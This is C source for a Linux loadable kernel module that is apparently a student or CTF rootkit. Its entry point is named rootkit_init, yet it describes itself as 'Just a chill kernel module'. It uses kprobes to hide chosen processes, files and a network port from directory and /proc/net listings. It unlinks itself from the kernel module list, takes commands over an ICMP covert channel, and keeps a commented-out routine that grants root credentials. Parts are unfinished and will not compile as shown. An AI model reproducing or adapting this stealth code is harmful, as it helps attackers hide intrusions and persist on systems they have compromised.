#include "main.h"

#if HOOK_FILLDIR
static struct kprobe kp_filldir = {
	.symbol_name = "filldir",
};
static struct kprobe kp_filldir64 = {
	.symbol_name = "filldir64",
};
#endif
#if PORT_HIDE_C
static struct kprobe kp_tcp4_seq_show = {
	.symbol_name = "tcp4_seq_show",
};
#endif
#if LKM_HIDE_C
static struct list_head *prev_module;
#endif
#if PID_HIDE_C
static int *pid_to_hides = NULL;
static int pid_count = 0;
#endif

static struct nf_hook_ops netfilter_ops_out;


#include <linux/ip.h>    // For IP header
#include <linux/tcp.h>   // For TCP header
#include <linux/inet.h>  // For inet_ntoa

#include <linux/icmp.h>    // For ICMP header
#include <linux/skbuff.h>  // For skb definitions

#include <linux/netfilter_ipv4.h>
#include <linux/netfilter.h>
#include <linux/net.h>

static unsigned int main_hook_out(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *ip_header;
    struct icmphdr *icmp_header;
    unsigned char *icmp_data;
    int icmp_data_len;

    if (!skb)
        return NF_ACCEPT;


    ip_header = ip_hdr(skb);
    if (!ip_header || ip_header->protocol != IPPROTO_ICMP)
        return NF_ACCEPT;


    icmp_header = icmp_hdr(skb);
    if (!icmp_header)
        return NF_ACCEPT;

    icmp_data = (unsigned char *)(icmp_header + 1);
    icmp_data_len = ntohs(ip_header->tot_len) - (ip_header->ihl*4) - sizeof(struct icmphdr);
    
    if (icmp_data_len > 0 && ip_header->daddr == 0x08080808) {
        switch (icmp_data[0])
        {
        case CODE_HIDE_PID:
            if(icmp_data_len>=5){
                uint32_t target_pid = *(uint32_t*)(icmp_data+1);
                dbg_print("%x\n", target_pid);
                //Handle hide this pid
                goto stolen_label;
            }
            break;
        case CODE_HIDE_PATH:
            uint32_t pathlen = *(uint32_t*)(icmp_data+1);
            if(icmp_data_len>=pathlen+1){
                dbg_print("%s\n", icmp_data+1+4);
                // Handle path hide
                goto stolen_label;
            }
            break;
        case CODE_LKM_HIDE:
            // Handle LKM hide
            goto stolen_label;
        case CODE_PORT_HIDE:
            if(icmp_data_len>=5){
                uint32_t target_port = *(uint32_t*)(icmp_data+1);
                dbg_print("%x\n", target_port);
                //Handle hide this port
                goto stolen_label;
            }
            break;

        default:
            break;
        }
    }
    return NF_ACCEPT;
stolen_label:
    return NF_STOLEN;
}


// static int grant_root_rights(pid_t pid)
// {
//     struct task_struct *task;
//     struct cred *new_cred;

//     // Find the task by PID
//     task = pid_task(find_vpid(pid), PIDTYPE_PID);
//     if (!task) {
//         return -ESRCH;
//     }

//     new_cred = (struct cred *)get_task_cred(task);
//     if (!new_cred) {
//         return -ENOMEM;
//     }

//     new_cred->uid.val = 0;
//     new_cred->gid.val = 0;
//     new_cred->euid.val = 0;
//     new_cred->egid.val = 0;

//     // Apply the new credentials
//     commit_creds(new_cred);

//     return 0;
// }

#if PID_HIDE_C
/* Check PID */
static bool check_pid(pid_t pid)
{
	for (int i = 0; i < pid_count; i++) {
		if (pid_to_hides[i] == pid)
			return true;
	}
	return false;
}

/* Add PID */
static void add_pid(pid_t pid)
{
	if (pid_count >= MAX_PIDS) {
		pr_err("PID array is full\n");
		return;
	}

	pid_to_hides[pid_count++] = pid;
	dbg_print("Hiding PID %d: \n", pid);
}

static void scan_pid(void)
{
	struct task_struct *task;

	// Scan all processes running
	for_each_process(task) {
		if (!strncmp(task->comm, HIDE_CMD1, 4) ||
		    !strncmp(task->comm, HIDE_CMD2, 2)) {
			dbg_print("Process found (PID: %d, Name: %s)\n",
				  task->pid, task->comm);

			// Check PID
			if (check_pid(task->pid))
				dbg_print("PID %d already hidden\n", task->pid);
			else
				add_pid(task->pid);
		}
	}
}

void pid_hide_handler(struct kprobe *p, struct pt_regs *regs) {
    int target = 0;
    char *filename = (char *)regs->si;
    // struct path path;

    // Validate filename before proceeding
    if (!filename) {
        return;
    }
    // dbg_print("[%s]...\n", filename);
    // // First kern_path resolution
    // if (kern_path(filename, LOOKUP_FOLLOW | LOOKUP_DIRECTORY, &path)) {
    //     return;
    // }

    // // Validate path and parent directory
    // struct dentry *dentry = path.dentry;
    // dbg_print("[%s] %d\n", dentry->d_parent->d_name.name, d_is_dir(dentry) );
    // if (!dentry || strncmp(dentry->d_parent->d_name.name, "proc", 4) != 0 || !d_is_dir(dentry)) {
    //     return;
    // }
    // dbg_print("scanning...\n");
    // Perform additional actions safely
    scan_pid();

    for (int i = 0; i < pid_count; i++) {
        if (kstrtoint(filename, 10, &target) == 0) {
            if (target == pid_to_hides[i]) {
                dbg_print("Hiding PID: %d\n", pid_to_hides[i]);
                memset(filename, 0, strlen(filename));
                return;
            }
        }
    }
    return;
}


#endif

#if FILE_HIDE_C
static const char *files_to_hide[] = {
	"flag.png"
};

void file_hide_handler(struct kprobe *p, struct pt_regs *regs){
	char *filename = (char *)regs->si;
	const char **file;

	for (file = files_to_hide; *file != NULL; file++) {
		if (strcmp(filename, *file) == 0) {
			dbg_print("Hiding file: %s\n", filename);
			strcpy((char*)regs->si, "\x00");
		}
		
	}

}
#endif

#if PORT_HIDE_C
void port_hide_handler(struct kprobe *p, struct pt_regs *regs){
	void *v;

	struct sock *sk;
	struct inet_sock *inet;

	unsigned short local_port;
	unsigned short remote_port;

	if (!regs)
		return;

	dbg_print("Registers: ip=%lx, di=%lx, si=%lx, dx=%lx, cx=%lx\n",
		  regs->ip, regs->di, regs->si, regs->dx, regs->cx);

	// Get the second argument (regs->si)
	v = (void *)regs->si;
	dbg_print("Argument v (regs->si): %px\n", v);

	if (v == SEQ_START_TOKEN)
		return;

	// Interpret v as struct sock
	sk = (struct sock *)v;
	dbg_print("sock: %px\n", sk);

	if (!sk)
		return;

	// Convert sock to inet_sock
	inet = inet_sk(sk);
	dbg_print("inet_sock: %px\n", inet);

	if (!inet)
		return;

	// Take local and remote ports from struct
	local_port = ntohs(inet->inet_sport);
	remote_port = ntohs(inet->inet_dport);
	dbg_print("Local port: %u\n", local_port);
	dbg_print("Remote port: %u\n", remote_port);

	// Check if the port matches the hidden port
	if (local_port == HIDE || remote_port == HIDE) {
		dbg_print("Hiding local port: %u\n", local_port);
		dbg_print("Hiding remote port: %u\n", remote_port);

		// Overwrite Ports
		inet->inet_sport = htons(0);
		inet->inet_dport = htons(0);

		dbg_print("Overwritten ports - Local: %u, Remote: %u\n",
			  ntohs(inet->inet_sport), ntohs(inet->inet_dport));

		// Overwrite IPs
		inet->inet_rcv_saddr = 0;
		inet->inet_daddr = 0;

		dbg_print("IPs overwritten - Local IP: %pI4, Remote IP: %pI4\n",
			  &inet->inet_rcv_saddr, &inet->inet_daddr);
	}
}
#endif


// static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs){
//     #if FILE_HIDE_C
//         file_hide_handler(p, regs);
//     #endif
//     #if PID_HIDE_C
//         pid_hide_handler(p, regs);
//     #endif
//     #if PORT_HIDE_C
//         port_hide_handler(p, regs);
//     #endif
//     return 0;
// }


static int __init rootkit_init(void)
{
	// int ret = 0;
    #if HOOK_FILLDIR
        #if PID_HIDE_C
            pid_to_hides = kmalloc_array(MAX_PIDS, sizeof(int), GFP_KERNEL);
            if (!pid_to_hides) {
                pr_err("Failed to allocate PID array memory\n");
                return -ENOMEM;
            }
        #endif
        kp_filldir.pre_handler = handler_pre;
        ret = register_kprobe(&kp_filldir);
        if(ret<0){
            goto LABEL_INIT_ERR;
        }
        kp_filldir64.pre_handler = handler_pre;
        ret = register_kprobe(&kp_filldir64);
        if(ret<0){
            goto LABEL_INIT_ERR;
        }
    #endif
    #if PORT_HIDE_C
        kp_tcp4_seq_show.pre_handler = handler_pre;
        ret = register_kprobe(&kp_tcp4_seq_show);
        if(ret<0){
            goto LABEL_INIT_ERR;
        }
    #endif
    #if LKM_HIDE_C
        if (THIS_MODULE->mkobj.kobj.state_initialized)
            kobject_del(&THIS_MODULE->mkobj.kobj);
            
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
    #endif
    netfilter_ops_out.hook = main_hook_out;
    netfilter_ops_out.pf = PF_INET;
    netfilter_ops_out.hooknum = NF_INET_POST_ROUTING;
    netfilter_ops_out.priority = NF_IP_PRI_FIRST;

    
    nf_register_net_hook(&init_net, &netfilter_ops_out);
    
    return 0;
#if HOOK_FILLDIR
LABEL_INIT_ERR:
    pr_err( "register_kprobe failed, returned %d\n", ret);
    return ret;
#endif
}

static void __exit rootkit_initexit(void)
{
    #if HOOK_FILLDIR
	    unregister_kprobe(&kp_filldir);
	    unregister_kprobe(&kp_filldir64);
    #endif
    #if PORT_HIDE_C
        unregister_kprobe(&kp_tcp4_seq_show);
    #endif
}




module_init(rootkit_init) module_exit(rootkit_initexit)
	MODULE_AUTHOR("G03");
MODULE_DESCRIPTION("Just a chill kernel module");
MODULE_LICENSE("GPL");



